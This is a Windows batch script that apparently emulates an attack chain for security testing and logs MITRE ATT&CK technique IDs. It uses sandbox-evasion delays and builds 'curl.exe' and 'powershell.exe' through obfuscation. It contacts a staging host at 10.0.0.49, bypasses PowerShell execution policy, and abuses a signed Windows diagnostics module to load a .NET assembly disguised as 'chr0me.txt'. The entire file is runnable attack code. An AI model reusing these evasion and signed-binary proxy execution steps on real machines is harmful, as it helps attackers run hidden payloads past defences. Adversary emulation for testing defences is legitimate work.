@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ constants - plain literals (DO NOT encode)
SET txisnba=%APPDATA%\8183\3a7ad3db
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8183-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=chr0me.txt
SET dvhhyc=8183

REM Create log directory if it doesn't exist
IF NOT EXIST "%APPDATA%\!rrocubc!\" mkdir "%APPDATA%\!rrocubc!\" 2>nul
SET hgertfd=%APPDATA%\!rrocubc!\macula-simulations.log

REM Initial sandbox evasion delay (45 seconds)
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: initial_delay=start >> "!hgertfd!" 2>&1
timeout /t 45 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: initial_delay=complete >> "!hgertfd!" 2>&1

REM Obfuscate curl.exe character-by-character
SET u1=c
SET u2=u
SET u3=r
SET u4=l
SET u5=.
SET u6=e
SET u7=x
SET u8=e
SET curlobf=!u1!!u2!!u3!!u4!!u5!!u6!!u7!!u8!

REM Heartbeat check to server
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_check=start >> "!hgertfd!" 2>&1
"!curlobf!" -k -s -o nul "!keghkgto!"
SET hb_result=!errorlevel!
IF !hb_result! EQU 0 (
    SET ttp_result_hb=1
    SET err_detail_hb=
) ELSE (
    SET ttp_result_hb=0
    SET err_detail_hb=connection_failed
)
REM TTP logging for network connection
SET log_line=[!DATE! !TIME!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1105|Ingress Tool Transfer=!ttp_result_hb!:!err_detail_hb!
echo !log_line! >> "!hgertfd!" 2>&1
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_check=!ttp_result_hb! >> "!hgertfd!" 2>&1

REM Delay between operations (10 seconds)
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: delay_heartbeat_execution=start >> "!hgertfd!" 2>&1
ping -n 10 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: delay_heartbeat_execution=complete >> "!hgertfd!" 2>&1

REM Build target directory path if needed
SET full_path="!txisnba!\!xzanpex!"
IF NOT EXIST "!txisnba!\" (
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: directory_creation=start >> "!hgertfd!" 2>&1
    mkdir "!txisnba!" 2>nul
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: directory_creation=complete >> "!hgertfd!" 2>&1
)

REM Random delay before execution (10-30 seconds)
SET /A random_delay=!RANDOM! %% 20 + 10
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: random_delay=!random_delay!s_start >> "!hgertfd!" 2>&1
timeout /t !random_delay! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: random_delay=complete >> "!hgertfd!" 2>&1

REM Obfuscate powershell.exe using character code encoding
SET ps_codes=112 111 119 101 114 115 104 101 108 108 46 101 120 101
SET ps_decode=
FOR %%c IN (!ps_codes!) DO ^(
    CMD /C EXIT %%c
    FOR /F %%A IN ('copy /z "%~f0" nul') DO SET "char=%%A"
    SET ps_decode=!ps_decode!!char!
^)

REM Obfuscate -ep using string substitution
SET encoded_ep=XYp Zypass
SET decoded_ep=!encoded_ep:X=-e!
SET decoded_ep=!decoded_ep:Y=-!

REM Obfuscate command parts
SET cmd_part1=set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin 
SET cmd_part2=;[Program.Class]::Dale()

REM Build full command with proper quoting
SET full_command=!ps_decode! !decoded_ep! -command "!cmd_part1!""!txisnba!\!xzanpex!""!cmd_part2!"

REM Execute .NET DLL via PowerShell
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: powershell_execution=start >> "!hgertfd!" 2>&1
!full_command!
SET exec_result=!errorlevel!
IF !exec_result! EQU 0 (
    SET ttp_result_exe=1
    SET err_detail_exe=
) ELSE (
    SET ttp_result_exe=0
    SET err_detail_exe=assembly_load_failed
)

REM TTP logging for T1218 - Signed Binary Proxy Execution
SET log_line2=[!DATE! !TIME!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed Binary Proxy Execution=!ttp_result_exe!:!err_detail_exe!
echo !log_line2! >> "!hgertfd!" 2>&1
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: powershell_execution=!ttp_result_exe! >> "!hgertfd!" 2>&1

REM Final delay before exit
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: final_delay=start >> "!hgertfd!" 2>&1
CHOICE /C Y /N /D Y /T 15 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: final_delay=complete >> "!hgertfd!" 2>&1

ENDLOCAL